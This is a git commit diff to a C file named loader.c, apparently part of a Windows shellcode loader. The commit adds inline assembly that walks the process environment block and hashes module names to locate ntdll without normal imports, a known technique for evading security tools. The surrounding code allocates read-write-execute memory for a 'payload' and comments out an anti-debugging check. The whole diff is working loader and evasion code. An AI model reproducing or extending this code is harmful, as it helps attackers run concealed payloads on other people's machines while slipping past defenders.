f2be3cb73b285241aa2209d5a7b2d42e63655d4d
Couscouz <rem.couzi@gmail.com>
2025-02-20 19:35:43 +0100

    getCustomHandle implemented and working

--- src/loader.c
+++ src/loader.c
@@ -2,7 +2,55 @@
 #include <stdio.h>
 
 
+HMODULE CustomGetModuleHandle(unsigned int module_hash) {
+    #ifdef _WIN64
+        void* module_base = NULL;
+        __asm__ __volatile__ (
+            // Initialize r10d with hash and set up PEB access
+            "movl %1, %%r10d\n\t"  
+            "xor %%rdx, %%rdx\n\t"
+            "mov %%gs:0x60, %%rdx\n\t"
+            "mov 0x18(%%rdx), %%rdx\n\t"
+            "mov 0x20(%%rdx), %%rdx\n\t"
+        "load_module_name:\n\t"
+            "mov 0x50(%%rdx), %%rsi\n\t"      // FullDllName.Buffer
+            "movzwq 0x4A(%%rdx), %%rcx\n\t"   // Length (16-bit to 64-bit)
+            "xor %%r9d, %%r9d\n\t"            // Clear hash accumulator
+        "module_hash_loop:\n\t"
+            "xor %%rax, %%rax\n\t"
+            "lodsb\n\t"                       // Load byte into AL
+            "cmp $0x61, %%al\n\t"             // Compare with 'a'
+            "jl skip_case_adjustment\n\t"
+            "sub $0x20, %%al\n\t"             // Convert to uppercase
+        "skip_case_adjustment:\n\t"
+            "rol $13, %%r9d\n\t"              // Rotate left by 13 bits
+            "add %%eax, %%r9d\n\t"            // Add AL to hash
+            "loop module_hash_loop\n\t"
+        "then:\n\t"
+            "cmp %%r10d, %%r9d\n\t"           // Compare hash
+            "je found\n\t"                     // If equal, jump to found
+        "load_next_module:\n\t"
+            "mov (%%rdx), %%rdx\n\t"          // Next module
+            "jmp load_module_name\n\t"
+        "found:\n\t"
+            "mov %%rdx, %0\n\t"               // Store result
+            : "=r" (module_base)              // Output
+            : "r" (module_hash)                // Input
+            : "rax", "rdx", "rsi", "rcx", "r9", "r10", "memory"  // Clobbers
+        );
+        return module_base;
+    #else
+        // 32-bit code TODO
+        return NULL;
+    #endif
+}
+
+
+
 void main() {
+
+
+
     ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);
 
     // int is_debugged = d();
@@ -20,6 +68,8 @@ void main() {
     HANDLE th;
     DWORD old_protect;
 
+    unsigned int ndtll_hash = 0xCCE6C0C4;
+    HMODULE hNtdll = CustomGetModuleHandle(ndtll_hash);
     
     // Allocating executable memory
     exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
